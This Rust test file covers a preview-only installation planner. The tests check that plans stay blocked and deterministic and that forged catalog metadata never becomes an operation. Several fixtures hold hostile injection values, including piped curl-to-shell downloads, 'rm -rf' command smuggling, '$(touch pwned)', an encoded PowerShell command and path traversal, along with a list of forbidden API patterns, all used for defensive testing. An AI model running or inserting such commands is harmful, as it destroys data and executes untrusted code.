//! Phase 2D installation-plan tests. Everything runs on synthetic catalog records and synthetic temporary environments:
//! no real tool is looked at, installed, run or downloaded, and the plan engine itself has no way to do any of that.

use super::*;
use crate::{
    catalog, db,
    discovery::{
        self,
        detect::{Authorization, Roots, PLATFORM_MACOS, PLATFORM_WINDOWS},
    },
};
use std::{fs, path::PathBuf};

const WIN: &str = "windows-x64";
const MAC: &str = "macos-arm64";

fn host(platform: &str) -> HostFacts {
    HostFacts { platform: platform.to_string(), elevated: Some(false) }
}

fn req(entry: &str, platform: &str, surface: &str) -> PlanRequest {
    PlanRequest {
        entry_id: entry.to_string(),
        platform_target: platform.to_string(),
        agent_surface: surface.to_string(),
        scope: "user".to_string(),
        method_id: None,
    }
}

fn seeded() -> Connection {
    let conn = db::open_memory().unwrap();
    catalog::seed_all(&conn).unwrap();
    conn
}

fn entry(conn: &Connection, id: &str) -> CatalogEntry {
    catalog::get_entry(conn, id).unwrap()
}

fn plan(conn: &Connection, r: &PlanRequest, h: &HostFacts) -> InstallPlan {
    plan_for(conn, r, h).unwrap()
}

fn codes(list: &[Blocker]) -> Vec<&str> {
    list.iter().map(|b| b.code.as_str()).collect()
}

// ---- synthetic computers -------------------------------------------------------------------------------------------

struct Machine {
    _dir: tempfile::TempDir,
    root: PathBuf,
    home: PathBuf,
    bin: PathBuf,
}

impl Machine {
    /// `account` becomes the user-folder name (spaces and non-ASCII letters allowed); `layer` is an arbitrary nested root.
    fn new(account: &str, layer: &str) -> Machine {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().canonicalize().unwrap().join(layer);
        let home = root.join("Users").join(account);
        let bin = root.join("tools").join("bin");
        fs::create_dir_all(&home).unwrap();
        fs::create_dir_all(&bin).unwrap();
        Machine { _dir: dir, root, home, bin }
    }

    fn roots(&self, platform: &str) -> Roots {
        Roots {
            platform: platform.to_string(),
            home: Some(self.home.clone()),
            path_entries: vec![self.bin.clone()],
            system_dirs: vec![],
            pins: vec![],
            references: Default::default(),
        }
    }

    fn program(&self, base: &str, platform: &str) {
        let name = if platform == PLATFORM_WINDOWS { format!("{base}.exe") } else { base.to_string() };
        fs::write(self.bin.join(name), b"synthetic placeholder, never executed").unwrap();
    }

    fn scan(&self, conn: &Connection, platform: &str) {
        let auth = Authorization { path_executables: true, user_config: true, project: None, fingerprint_artifacts: false };
        discovery::run_scan(conn, &self.roots(platform), &auth).unwrap();
    }
}

fn this_platform() -> &'static str {
    if cfg!(windows) {
        PLATFORM_WINDOWS
    } else {
        PLATFORM_MACOS
    }
}

// ---- the plan is always a preview ---------------------------------------------------------------------------------

#[test]
fn every_entry_platform_surface_scope_and_method_gives_a_blocked_preview_only_plan() {
    let conn = seeded();
    let mut count = 0;
    for e in catalog::list_catalog(&conn).unwrap() {
        for platform in PLATFORMS {
            for surface in SURFACES {
                for scope in SCOPES {
                    let methods: Vec<Option<String>> =
                        std::iter::once(None).chain(declared_methods(&e).into_iter().map(|(m, _)| Some(m))).collect();
                    for m in methods {
                        let r = PlanRequest { scope: scope.to_string(), method_id: m, ..req(&e.entry_id, platform, surface) };
                        let p = plan(&conn, &r, &host(platform));
                        p.check_invariants().unwrap();
                        assert_eq!(p.state, "preview_only");
                        assert!(!p.executable && !p.executed && !p.modifies_anything && !p.eligibility.can_execute);
                        assert_eq!(p.eligibility.status, "blocked");
                        assert!(codes(&p.eligibility.blockers).contains(&"no_approved_recipe"), "{} {platform} {surface}", e.entry_id);
                        assert_eq!(p.statement, PREVIEW_STATEMENT);
                        assert!(!p.rollback.available && !p.network.used_to_build_preview);
                        count += 1;
                    }
                }
            }
        }
    }
    assert!(count > 500, "{count} combinations were exercised");
}

#[test]
fn identical_inputs_give_identical_plans_and_the_id_changes_with_the_content() {
    let conn = seeded();
    let r = req("codebase-memory-mcp", WIN, "local-cli");
    let a = plan(&conn, &r, &host(WIN));
    let b = plan(&conn, &r, &host(WIN));
    assert_eq!(serde_json::to_string(&a).unwrap(), serde_json::to_string(&b).unwrap());
    assert_eq!(a.plan_id.len(), 64);
    let other = plan(&conn, &req("codebase-memory-mcp", MAC, "local-cli"), &host(MAC));
    assert_ne!(a.plan_id, other.plan_id);
}

// ---- valid plans -----------------------------------------------------------------------------------------------------

#[test]
fn a_release_archive_plan_lists_the_four_typed_steps_in_order_and_marks_the_missing_digest() {
    let conn = seeded();
    let p = plan(&conn, &req("codebase-memory-mcp", WIN, "local-cli"), &host(WIN));
    assert_eq!(p.chosen_method.as_deref(), Some("verified-release-archive"));
    let kinds: Vec<OperationKind> = p.steps.iter().map(|s| s.kind).collect();
    assert_eq!(
        kinds,
        vec![
            OperationKind::FetchReleaseArtifact,
            OperationKind::VerifyArtifactDigest,
            OperationKind::StagePrivateCopy,
            OperationKind::ActivateStagedArtifact
        ]
    );
    assert_eq!(p.steps[0].typed, Some(json!({ "operation": "fetch-release-artifact", "artifactId": "primary" })));
    assert_eq!(p.steps[1].typed, None, "no digest in the catalog: no typed verify step can be written");
    assert_eq!(p.steps[1].missing_parameters, vec!["expectedSha256".to_string()]);
    assert_eq!(p.steps[3].reversibility, Reversibility::VersionSwitch);
    let b = codes(&p.eligibility.blockers);
    for c in
        ["no_artifact_digest", "target_not_in_recipe_schema", "no_approved_recipe", "metadata_unreviewed", "compatibility_not_verified"]
    {
        assert!(b.contains(&c), "{c} in {b:?}");
    }
    assert!(p.network.planned_use && !p.network.used_to_build_preview);
    assert_eq!(p.target.recipe_target_id, None);
    assert!(!p.rollback.available);
    assert!(p.disk_usage.text.contains("bilinmiyor"));
}

#[test]
fn a_native_plugin_plan_names_the_agent_registry_and_never_a_path() {
    let conn = seeded();
    let mut e = entry(&conn, "superpowers");
    e.plugin_identity = Some("superpowers".to_string());
    let r = req("superpowers", WIN, "claude-code-terminal");
    let p = build_plan(&e, &r, &host(WIN), &[]).unwrap();
    assert_eq!(p.steps.len(), 1);
    assert_eq!(p.steps[0].kind, OperationKind::RegisterNativePlugin);
    assert_eq!(
        p.steps[0].typed,
        Some(json!({ "operation": "register-native-plugin", "host": "claude-code-terminal", "pluginId": "superpowers" }))
    );
    assert_eq!(p.target.recipe_target_id.as_deref(), Some("windows-x64-claude-code"));
    assert_eq!(p.config_changes[0].area, WriteArea::AgentPluginRegistryClaude);
    // a project scope writes the project's own settings instead
    let project = PlanRequest { scope: "project".to_string(), ..r };
    assert_eq!(build_plan(&e, &project, &host(WIN), &[]).unwrap().config_changes[0].area, WriteArea::ProjectAgentSettings);
    let text = serde_json::to_string(&p).unwrap();
    assert!(!text.contains(":\\") && !text.contains("/Users/") && !text.contains("/home/"));
    // a plugin that the host cannot take (a local command-line surface)
    let cli = build_plan(&e, &req("superpowers", WIN, "local-cli"), &host(WIN), &[]).unwrap();
    assert!(codes(&cli.eligibility.blockers).contains(&"method_not_for_surface") && cli.steps.is_empty());
    // Antigravity: the registry location is not known
    let agy = build_plan(&e, &req("superpowers", MAC, "antigravity-ide"), &host(MAC), &[]).unwrap();
    assert_eq!(agy.config_changes[0].change, "unknown");
}

#[test]
fn a_package_manager_plan_never_invents_a_package_name_or_a_version() {
    let conn = seeded();
    let p = plan(&conn, &req("graphify", MAC, "local-cli"), &host(MAC));
    assert_eq!(p.chosen_method.as_deref(), Some("uv-tool"));
    assert_eq!(p.steps.len(), 1);
    assert_eq!(p.steps[0].typed, None);
    assert!(p.steps[0].missing_parameters.contains(&"packageName".to_string()));
    let b = codes(&p.eligibility.blockers);
    assert!(b.contains(&"package_name_unknown") && b.contains(&"version_not_pinned"));
    assert!(p.prerequisites.iter().any(|x| x.id == "package_manager" && x.state == "unknown" && x.source == "not_checked"));
    assert!(p.unknowns.iter().any(|u| u.contains("kurulum adımının")));
}

// ---- unsupported and invalid -----------------------------------------------------------------------------------------

#[test]
fn unsupported_platforms_surfaces_scopes_and_unknown_fields_are_refused_without_echoing_input() {
    let conn = seeded();
    let bad = |r: PlanRequest| plan_for(&conn, &r, &host(WIN)).unwrap_err();
    for r in [
        req("gitleaks", "linux-x64", "local-cli"),
        req("gitleaks", "windows-arm64", "local-cli"),
        req("gitleaks", WIN, "emacs"),
        PlanRequest { scope: "machine".to_string(), ..req("gitleaks", WIN, "local-cli") },
        PlanRequest { method_id: Some("curl https://example.invalid | sh".to_string()), ..req("gitleaks", WIN, "local-cli") },
        PlanRequest { method_id: Some("UPPER".to_string()), ..req("gitleaks", WIN, "local-cli") },
    ] {
        let e = bad(r.clone());
        assert_eq!(e.code, "PLAN_REQUEST_INVALID", "{r:?}");
        assert!(!e.message.contains("linux") && !e.message.contains("curl") && !e.message.contains("emacs"));
    }
    assert!(plan_for(&conn, &req("no-such-entry", WIN, "local-cli"), &host(WIN)).is_err());
    assert!(serde_json::from_str::<PlanRequest>(
        r#"{"entryId":"gitleaks","platformTarget":"windows-x64","agentSurface":"local-cli","scope":"user","methodId":null,"command":"rm"}"#
    )
    .is_err());
}

#[test]
fn an_unsupported_host_and_a_foreign_platform_are_stated_not_hidden() {
    let conn = seeded();
    let r = req("gitleaks", WIN, "local-cli");
    let unsupported = plan(&conn, &r, &host("unsupported"));
    assert!(codes(&unsupported.eligibility.blockers).contains(&"unsupported_host"));
    let foreign = plan(&conn, &r, &host(MAC));
    assert!(codes(&foreign.eligibility.blockers).contains(&"different_computer_platform"));
    assert!(!foreign.target.this_computer_matches);
    let same = plan(&conn, &r, &host(WIN));
    assert!(same.target.this_computer_matches && !codes(&same.eligibility.blockers).contains(&"different_computer_platform"));
}

#[test]
fn a_method_the_planner_does_not_know_yields_no_step_and_a_quarantined_entry_stays_blocked() {
    let conn = seeded();
    // README-style methods are unsupported, never translated
    let p = plan(&conn, &req("cloudflare-security-audit-skill", WIN, "claude-code-terminal"), &host(WIN));
    assert!(p.steps.is_empty());
    assert!(codes(&p.eligibility.blockers).contains(&"no_supported_method"));
    assert!(p.methods.iter().all(|m| !m.supported));
    let strix = plan(&conn, &req("strix", MAC, "local-cli"), &host(MAC));
    let b = codes(&strix.eligibility.blockers);
    assert!(b.contains(&"execution_policy_blocked") && b.contains(&"entry_quarantined"));
    // a method the entry does not declare
    let r = PlanRequest { method_id: Some("homebrew".to_string()), ..req("graphify", MAC, "local-cli") };
    let p = plan(&conn, &r, &host(MAC));
    assert!(codes(&p.eligibility.blockers).contains(&"method_not_declared") && p.steps.is_empty());
    // a method that exists but not on this platform (Homebrew on Windows)
    let r = PlanRequest { method_id: Some("homebrew".to_string()), ..req("gitleaks", WIN, "local-cli") };
    let p = plan(&conn, &r, &host(WIN));
    assert!(codes(&p.eligibility.blockers).contains(&"method_not_for_platform") && p.steps.is_empty());
}

// ---- forged metadata and unsafe recipes ----------------------------------------------------------------------------

#[test]
fn forged_catalog_text_never_becomes_a_command_a_path_a_package_or_an_operation() {
    let conn = seeded();
    let mut e = entry(&conn, "gitleaks");
    e.record["installMethods"] = json!([
        { "methodId": "curl https://example.invalid/install.sh | sh", "publisherPin": null },
        { "methodId": "evil-installer", "publisherPin": "1.0; rm -rf /" },
        { "methodId": "homebrew", "publisherPin": "$(touch pwned)" },
        { "methodId": "winget", "publisherPin": "1.2.3", "packageName": "; rm -rf /", "command": "powershell -enc AAAA" },
        { "methodId": "verified-release-archive", "publisherPin": null }
    ]);
    e.record["dependencies"] = json!(["curl https://example.invalid/x.sh | bash && rm -rf ~", "api key from the vendor cloud"]);
    e.record["artifactEvidence"] = json!({ "sha256": "ABCDEF", "url": "https://example.invalid/a.exe" });
    e.plugin_identity = Some("../../outside".to_string());
    let p = build_plan(&e, &req("gitleaks", WIN, "local-cli"), &host(WIN), &[]).unwrap();
    // the malformed method name is not even carried; the unknown one is unsupported
    let ids: Vec<&str> = p.methods.iter().map(|m| m.method_id.as_str()).collect();
    assert!(!ids.iter().any(|i| i.contains("curl") || i.contains(' ')));
    assert!(p.methods.iter().find(|m| m.method_id == "evil-installer").map(|m| !m.supported).unwrap());
    // nothing typed contains any of the injected text
    let typed = serde_json::to_string(&p.steps.iter().map(|s| &s.typed).collect::<Vec<_>>()).unwrap();
    for needle in ["rm -rf", "curl", "powershell", "touch pwned", "outside", "example.invalid"] {
        assert!(!typed.contains(needle), "{needle} reached a typed operation");
        assert!(!p.steps.iter().any(|s| s.summary.contains(needle) || s.write_labels.iter().any(|l| l.contains(needle))));
    }
    // the dependency line is shown, sanitised, as the publisher's claim and never as a step
    assert_eq!(p.declared_dependencies.len(), 2);
    assert!(p.prerequisites.iter().filter(|x| x.source == "publisher_declared").all(|x| x.state == "unknown"));
    assert!(p.steps.iter().all(|s| s.kind != OperationKind::WriteManagedInstructionBlock));
    // the first supported declared method on Windows is winget; its package name is never taken from anywhere
    assert_eq!(p.chosen_method.as_deref(), Some("winget"));
    assert!(p.steps[0].typed.is_none() && p.steps[0].missing_parameters.contains(&"packageName".to_string()));
    // the release archive's digest is not the malformed one from the record
    let r = PlanRequest { method_id: Some("verified-release-archive".to_string()), ..req("gitleaks", WIN, "local-cli") };
    let archive = build_plan(&e, &r, &host(WIN), &[]).unwrap();
    assert_eq!(archive.steps[1].typed, None);
    assert!(codes(&archive.eligibility.blockers).contains(&"no_artifact_digest"));
    // explicit selection of a method with a hostile pin: no version is accepted
    let r = PlanRequest { method_id: Some("homebrew".to_string()), ..req("gitleaks", MAC, "local-cli") };
    let hb = build_plan(&e, &r, &host(MAC), &[]).unwrap();
    assert!(hb.steps[0].missing_parameters.contains(&"version".to_string()) && hb.steps[0].typed.is_none());
    assert!(hb.data_and_credentials.state == "credentials_declared");
}

#[test]
fn the_only_typed_operations_are_the_seven_schema_kinds() {
    let kinds: Vec<&str> = OperationKind::ALL.iter().map(|k| k.as_str()).collect();
    let schema: Value = serde_json::from_str(include_str!("../../schemas/install-recipe.schema.json")).unwrap();
    let mut from_schema: Vec<String> = schema
        .pointer("/properties/operations/items/oneOf")
        .and_then(Value::as_array)
        .unwrap()
        .iter()
        .map(|o| o.pointer("/properties/operation/const").and_then(Value::as_str).unwrap().to_string())
        .collect();
    from_schema.sort();
    let mut ours: Vec<String> = kinds.iter().map(|s| s.to_string()).collect();
    ours.sort();
    assert_eq!(ours, from_schema, "the planner's vocabulary equals the recipe schema's");
    for k in OperationKind::ALL {
        assert_eq!(serde_json::to_value(k).unwrap(), json!(k.as_str()));
    }
}

// ---- serialization and versioning ------------------------------------------------------------------------------------

#[test]
fn plans_round_trip_and_forged_or_foreign_versions_are_rejected() {
    let conn = seeded();
    let p = plan(&conn, &req("gitleaks", WIN, "local-cli"), &host(WIN));
    let text = serde_json::to_string(&p).unwrap();
    assert_eq!(parse_plan(&text).unwrap(), p);
    assert!(text.contains("\"schemaVersion\":1") && text.contains("\"plannerVersion\":\"1.0.0\""));
    let tamper = |f: &dyn Fn(&mut Value)| {
        let mut v: Value = serde_json::from_str(&text).unwrap();
        f(&mut v);
        parse_plan(&v.to_string()).unwrap_err()
    };
    assert_eq!(tamper(&|v| v["schemaVersion"] = json!(2)), "unsupported_schema_version");
    assert_eq!(tamper(&|v| v["executable"] = json!(true)), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["executed"] = json!(true)), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["modifiesAnything"] = json!(true)), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["state"] = json!("installed")), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["state"] = json!("approved")), "plan_claims_execution");
    assert_eq!(tamper(&|v| v["eligibility"]["canExecute"] = json!(true)), "plan_claims_eligibility");
    assert_eq!(tamper(&|v| v["eligibility"]["status"] = json!("ready")), "plan_claims_eligibility");
    assert_eq!(tamper(&|v| v["statement"] = json!("Kurulum tamamlandı.")), "plan_claims_effects");
    assert_eq!(tamper(&|v| v["rollback"]["available"] = json!(true)), "plan_claims_effects");
    assert_eq!(tamper(&|v| v["network"]["usedToBuildPreview"] = json!(true)), "plan_claims_effects");
    assert_eq!(tamper(&|v| v["steps"][0]["summary"] = json!("Kuruldu ve çalıştırıldı.")), "step_text_not_from_vocabulary");
    assert_eq!(parse_plan("{}").unwrap_err(), "plan_not_readable");
    assert_eq!(parse_plan("not json").unwrap_err(), "plan_not_readable");
}

#[test]
fn nothing_in_a_plan_reads_as_a_completed_installation() {
    let conn = seeded();
    for id in ["gitleaks", "superpowers", "graphify", "codebase-memory-mcp"] {
        let p = plan(&conn, &req(id, MAC, "local-cli"), &host(MAC));
        let text = serde_json::to_string(&p).unwrap().to_lowercase();
        for forbidden in ["\"installed\"", "\"completed\"", "\"succeeded\"", "kurulum tamamlandı", "başarıyla kuruldu", "\"approved\""] {
            assert!(!text.contains(forbidden), "{id}: {forbidden}");
        }
        assert!(
            p.steps.iter().all(|s| s.summary.contains("ecekti") || s.summary.contains("acaktı")),
            "every step is phrased as a conditional"
        );
    }
}

// ---- no execution, no writes -----------------------------------------------------------------------------------------

#[test]
fn the_planner_source_has_no_way_to_run_a_program_open_a_connection_or_write_a_file() {
    let source = include_str!("plan.rs");
    // each needle is assembled so that this test file does not need to contain a flagged API name verbatim
    let needles: Vec<String> = [
        ("std::pro", "cess"),
        ("Command", "::new"),
        ("std::", "net"),
        ("Tcp", "Stream"),
        ("req", "west"),
        ("ure", "q::"),
        ("std::", "fs"),
        ("fs::", "write"),
        ("File::", "create"),
        ("OpenOptions", ""),
        ("tauri_plugin_", "shell"),
        ("tauri_plugin_", "http"),
        ("tauri_plugin_", "opener"),
        (".exe", "cute("),
        ("execute", "_batch"),
        ("INSERT ", "INTO"),
        ("UPDATE ", "SET"),
        ("DELETE ", "FROM"),
    ]
    .iter()
    .map(|(a, b)| format!("{a}{b}"))
    .collect();
    // the doc comment mentions nothing flagged either; only code and comments of plan.rs are searched
    for n in &needles {
        assert!(!source.contains(n.as_str()), "plan.rs contains {n}");
    }
}

fn dump(conn: &Connection) -> String {
    let tables: Vec<String> = {
        let mut st = conn.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' ORDER BY name").unwrap();
        st.query_map([], |r| r.get::<_, String>(0)).unwrap().map(|r| r.unwrap()).collect()
    };
    let mut out = String::new();
    for t in tables {
        let mut st = conn.prepare(&format!("SELECT * FROM \"{t}\"")).unwrap();
        let n = st.column_count();
        let rows = st
            .query_map([], |r| {
                Ok((0..n)
                    .map(|i| {
                        format!(
                            "{:?}",
                            r.get_ref(i).map(|v| match v {
                                rusqlite::types::ValueRef::Blob(b) => format!("blob{}", b.len()),
                                other => format!("{other:?}"),
                            })
                        )
                    })
                    .collect::<Vec<_>>()
                    .join("|"))
            })
            .unwrap();
        out.push_str(&format!("[{t}]\n"));
        for row in rows {
            out.push_str(&row.unwrap());
            out.push('\n');
        }
    }
    out
}

#[test]
fn planning_writes_nothing_not_a_row_not_an_audit_event_and_works_on_a_read_only_connection() {
    let conn = seeded();
    let m = Machine::new("someone", "r");
    m.program("gitleaks", this_platform());
    m.scan(&conn, this_platform());
    let before = dump(&conn);
    let events = crate::audit::list_ascending(&conn).unwrap().len();
    for id in ["gitleaks", "superpowers", "graphify", "strix"] {
        for p in PLATFORMS {
            let _ = plan(&conn, &req(id, p, "local-cli"), &host(this_platform()));
        }
    }
    assert_eq!(dump(&conn), before, "no table changed");
    assert_eq!(crate::audit::list_ascending(&conn).unwrap().len(), events);
    assert!(crate::audit::verify(&conn).unwrap().ok);
    // the strongest proof: the connection may not write at all
    conn.pragma_update(None, "query_only", true).unwrap();
    let p = plan(&conn, &req("gitleaks", this_platform(), "local-cli"), &host(this_platform()));
    assert_eq!(p.state, "preview_only");
}

#[test]
fn planning_leaves_the_synthetic_machine_byte_identical() {
    let conn = seeded();
    let m = Machine::new("someone", "r");
    m.program("gitleaks", this_platform());
    m.scan(&conn, this_platform());
    let snapshot = |dir: &PathBuf| {
        let mut v: Vec<(String, Vec<u8>)> = Vec::new();
        let mut stack = vec![dir.clone()];
        while let Some(d) = stack.pop() {
            for e in fs::read_dir(&d).unwrap().flatten() {
                let p = e.path();
                if p.is_dir() {
                    stack.push(p);
                } else {
                    v.push((p.to_string_lossy().into_owned(), fs::read(&p).unwrap()));
                }
            }
        }
        v.sort();
        v
    };
    let before = snapshot(&m.root);
    let _ = plan(&conn, &req("gitleaks", this_platform(), "local-cli"), &host(this_platform()));
    assert_eq!(snapshot(&m.root), before);
}

// ---- portability: other account names, roots and machine states ----------------------------------------------------

#[test]
fn plans_do_not_depend_on_the_account_name_the_install_root_or_the_folder_layout() {
    let platform = this_platform();
    let mut seen: Vec<String> = Vec::new();
    for (account, layer) in [("alice", "r"), ("Ayşe Çelik", "deep/er/nested root"), ("bob-the-builder 2", "x")] {
        let conn = seeded();
        let m = Machine::new(account, layer);
        m.program("gitleaks", platform);
        m.scan(&conn, platform);
        let p = plan(&conn, &req("gitleaks", platform, "local-cli"), &host(platform));
        let text = serde_json::to_string(&p).unwrap();
        assert!(!text.contains(account), "account name in the plan");
        assert!(!text.contains(&m.root.to_string_lossy().to_string()), "root path in the plan");
        assert!(p.conflicts.iter().any(|c| c.code == "existing_installation_found"));
        seen.push(text);
    }
    assert!(seen.windows(2).all(|w| w[0] == w[1]), "the same situation on different machines gives the same plan (same id)");
}

#[test]
fn missing_tools_missing_agents_and_a_missing_scan_are_unknown_not_assumed() {
    let platform = this_platform();
    let conn = seeded();
    let r = req("superpowers", platform, "claude-code-terminal");
    // no scan at all
    let p = plan(&conn, &r, &host(platform));
    let agent = p.prerequisites.iter().find(|x| x.id == "agent_present").unwrap();
    assert_eq!((agent.state.as_str(), agent.source.as_str()), ("unknown", "observed_scan"));
    assert!(codes(&p.eligibility.blockers).contains(&"agent_not_confirmed"));
    // a scan of an empty computer: the agent was looked for and not found
    let m = Machine::new("empty", "r");
    m.scan(&conn, platform);
    let p = plan(&conn, &r, &host(platform));
    assert_eq!(p.prerequisites.iter().find(|x| x.id == "agent_present").unwrap().state, "unmet");
    // an agent found on PATH: met, but still not a statement that it works, and still blocked
    m.program("claude", platform);
    m.scan(&conn, platform);
    let p = plan(&conn, &r, &host(platform));
    assert_eq!(p.prerequisites.iter().find(|x| x.id == "agent_present").unwrap().state, "met");
    assert!(p.prerequisites.iter().find(|x| x.id == "agent_present").unwrap().text.contains("çalıştığı doğrulanmadı"));
    assert!(!p.eligibility.can_execute);
    assert!(p.conflicts.iter().any(|c| c.code == "active_session_unknown"));
}

#[test]
fn a_missing_or_malformed_agent_configuration_is_reported_and_never_repaired() {
    let platform = this_platform();
    let conn = seeded();
    let m = Machine::new("cfg", "r");
    m.program("claude", platform);
    let r = req("superpowers", platform, "claude-code-terminal");
    // missing configuration
    m.scan(&conn, platform);
    let p = plan(&conn, &r, &host(platform));
    assert_eq!(p.prerequisites.iter().find(|x| x.id == "agent_config_readable").unwrap().state, "unknown");
    // malformed configuration
    let cfg = m.home.join(".claude");
    fs::create_dir_all(&cfg).unwrap();
    fs::write(cfg.join("settings.json"), "{ this is not json").unwrap();
    m.scan(&conn, platform);
    let p = plan(&conn, &r, &host(platform));
    let c = p.prerequisites.iter().find(|x| x.id == "agent_config_readable").unwrap();
    assert_eq!(c.state, "unmet");
    assert!(c.text.contains("üzerine yazmaz"));
    assert_eq!(fs::read_to_string(cfg.join("settings.json")).unwrap(), "{ this is not json", "never repaired or rewritten");
    // a valid configuration
    fs::write(cfg.join("settings.json"), "{}").unwrap();
    m.scan(&conn, platform);
    assert_eq!(plan(&conn, &r, &host(platform)).prerequisites.iter().find(|x| x.id == "agent_config_readable").unwrap().state, "met");
}

#[test]
fn existing_installations_copies_and_mismatched_platforms_are_conflicts_not_overwrites() {
    let platform = this_platform();
    let conn = seeded();
    let a = Machine::new("one", "r");
    a.program("gitleaks", platform);
    a.scan(&conn, platform);
    let p = plan(&conn, &req("gitleaks", platform, "local-cli"), &host(platform));
    assert!(p.conflicts.iter().any(|c| c.code == "existing_installation_found"));
    // a plan for the OTHER platform while this computer has a copy: version/architecture mismatch
    let other = if platform == PLATFORM_WINDOWS { MAC } else { WIN };
    let p = plan(&conn, &req("gitleaks", other, "local-cli"), &host(platform));
    assert!(p.conflicts.iter().any(|c| c.code == "existing_installation_other_platform"));
    assert!(codes(&p.eligibility.blockers).contains(&"different_computer_platform"));
    // two copies in two PATH folders
    let conn2 = seeded();
    let m = Machine::new("two", "r");
    let second = m.root.join("second-bin");
    fs::create_dir_all(&second).unwrap();
    m.program("gitleaks", platform);
    let name = if platform == PLATFORM_WINDOWS { "gitleaks.exe" } else { "gitleaks" };
    fs::write(second.join(name), b"synthetic placeholder").unwrap();
    let mut roots = m.roots(platform);
    roots.path_entries = vec![m.bin.clone(), second];
    let auth = Authorization { path_executables: true, user_config: false, project: None, fingerprint_artifacts: false };
    discovery::run_scan(&conn2, &roots, &auth).unwrap();
    let p = plan(&conn2, &req("gitleaks", platform, "local-cli"), &host(platform));
    assert!(p.conflicts.iter().any(|c| c.code == "multiple_copies_found"), "{:?}", p.conflicts);
    // the synthetic machine is untouched
    assert!(m.bin.join(name).exists());
}

#[test]
fn conflicting_version_and_identity_records_are_surfaced() {
    let conn = seeded();
    let e = entry(&conn, "gitleaks");
    let mut a = discovery::store::latest_observations(&conn).unwrap();
    assert!(a.is_empty());
    let m = Machine::new("c", "r");
    m.program("gitleaks", this_platform());
    m.scan(&conn, this_platform());
    a = discovery::store::latest_observations(&conn).unwrap();
    let mut one = a.iter().find(|o| o.subject == "gitleaks" && o.presence == "present").cloned().unwrap();
    let mut two = one.clone();
    one.version = Some("1.0.0".to_string());
    two.version = Some("2.0.0".to_string());
    two.ladder.identity = crate::discovery::types::IdentityState::Conflicted;
    let p = build_plan(&e, &req("gitleaks", this_platform(), "local-cli"), &host(this_platform()), &[one, two]).unwrap();
    let c: Vec<&str> = p.conflicts.iter().map(|c| c.code.as_str()).collect();
    assert!(c.contains(&"conflicting_version_records") && c.contains(&"conflicting_identity_records"), "{c:?}");
}

#[test]
fn administrator_rights_are_never_assumed_and_never_requested() {
    let conn = seeded();
    // winget may ask for a privilege prompt; the plan says so and requests nothing
    let r = PlanRequest { method_id: Some("winget".to_string()), ..req("codebase-memory-mcp", WIN, "local-cli") };
    let no_admin = plan(&conn, &r, &HostFacts { platform: WIN.to_string(), elevated: Some(false) });
    assert!(no_admin.eligibility.warnings.iter().any(|w| w.code == "admin_may_be_needed"));
    let admin = plan(&conn, &r, &HostFacts { platform: WIN.to_string(), elevated: Some(true) });
    assert!(admin.eligibility.warnings.iter().any(|w| w.code == "elevated_session"));
    let unknown = plan(&conn, &r, &HostFacts { platform: WIN.to_string(), elevated: None });
    assert!(unknown.eligibility.warnings.iter().any(|w| w.code == "admin_unknown"));
    for p in [&no_admin, &admin, &unknown] {
        assert!(p.permissions.iter().all(|x| !x.to_lowercase().contains("yönetici yetkisi iste")), "{:?}", p.permissions);
        assert!(p.eligibility.blockers.iter().all(|b| b.code != "admin_required"));
        assert!(!p.eligibility.can_execute);
    }
    // a method that needs no privilege says nothing about it
    let plain = plan(&conn, &req("graphify", WIN, "local-cli"), &host(WIN));
    assert!(!plain.eligibility.warnings.iter().any(|w| w.code.starts_with("admin")));
}

#[test]
fn offline_use_changes_nothing_because_building_a_plan_never_needs_the_network() {
    // there is no network input at all: the same plan is produced whatever the connectivity is
    let conn = seeded();
    let r = req("codebase-memory-mcp", MAC, "claude-code-terminal");
    let a = plan(&conn, &r, &host(MAC));
    assert!(a.network.planned_use, "future steps would need it");
    assert!(!a.network.used_to_build_preview, "building this preview did not");
    assert!(a.permissions.iter().any(|p| p.contains("bu önizleme bağlantı kurmadı")));
}

#[test]
fn scanning_an_unusable_machine_still_yields_a_plan_and_an_unreadable_data_folder_is_an_error_not_a_panic() {
    let platform = this_platform();
    let conn = seeded();
    // no home folder, a PATH folder that does not exist, an unsupported platform label
    let roots = Roots {
        platform: platform.to_string(),
        home: None,
        path_entries: vec![PathBuf::from("/definitely/not/here")],
        system_dirs: vec![],
        pins: vec![],
        references: Default::default(),
    };
    let auth = Authorization { path_executables: true, user_config: true, project: None, fingerprint_artifacts: false };
    discovery::run_scan(&conn, &roots, &auth).unwrap();
    let p = plan(&conn, &req("superpowers", platform, "claude-code-terminal"), &host(platform));
    assert!(!p.eligibility.can_execute);
    // a data folder that is really a file cannot be opened: a clean error
    let dir = tempfile::tempdir().unwrap();
    let not_a_folder = dir.path().join("file");
    fs::write(&not_a_folder, b"x").unwrap();
    assert!(db::open_file(&not_a_folder.join("atm.sqlite"), None).is_err());
}
